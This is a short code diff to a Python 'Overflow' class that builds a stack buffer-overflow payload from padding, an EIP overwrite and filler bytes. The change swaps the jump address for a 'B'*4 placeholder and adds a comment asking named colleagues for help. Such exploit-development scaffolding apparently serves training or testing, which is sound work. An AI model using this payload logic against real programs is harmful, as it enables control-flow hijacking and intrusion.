@@ -555,7 +555,7 @@ class Overflow:
 				if not self.jump_eip:
 					raise NoEipMemoryAddressError("Please set the `jump_eip` value in order to test jump esp memory address") from None
 				payload = ("A"*self.offset 
-					+ self.jump_eip 
+					+ "B"*4 # self.jump_eip ----( Ask Veer or Frank for help!!!!
 					+ "C"*4
 					+ "D"*(self.num_bytes_crash-self.offset-len(self.nop_sled)-4)
 				)
